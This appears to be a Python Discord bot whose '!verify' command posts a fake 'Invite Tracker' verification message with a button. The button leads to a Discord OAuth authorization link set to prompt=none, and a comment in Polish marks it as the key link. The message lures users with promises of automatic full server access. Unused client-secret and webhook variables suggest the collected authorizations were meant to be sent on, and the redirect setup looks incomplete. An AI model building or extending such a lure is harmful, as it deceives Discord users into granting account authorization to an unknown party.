import discord
from discord.ext import commands
import os
import requests

BOT_TOKEN = os.getenv("BOT_TOKEN")
CLIENT_ID = os.getenv("CLIENT_ID")
CLIENT_SECRET = os.getenv("CLIENT_SECRET")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")

bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

@bot.event
async def on_ready():
    print(f"✅ Zalogowano jako {bot.user}")

@bot.command()
async def verify(ctx):
    embed = discord.Embed(
        title="Verification",
        description="This is the beginning of this server. Here are a few steps to help you get started!",
        color=0x5865F2
    )
    embed.add_field(name="Invite Friends", value="\u200b", inline=False)
    embed.set_footer(text="28 August 2026")
    embed.set_author(name="Invite Tracker", icon_url="https://cdn.discordapp.com/emojis/123456789.png")

    # TO JEST KLUCZOWY LINK - używa prompt=none
    oauth_link = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri=https://discord.com/oauth2/authorize&scope=identify&prompt=none"

    view = discord.ui.View()
    view.add_item(discord.ui.Button(label="Verify", url=oauth_link, style=discord.ButtonStyle.danger))

    await ctx.send("Simply press on the button and get full server access automatically! ❤️", embed=embed, view=view)

bot.run(BOT_TOKEN)
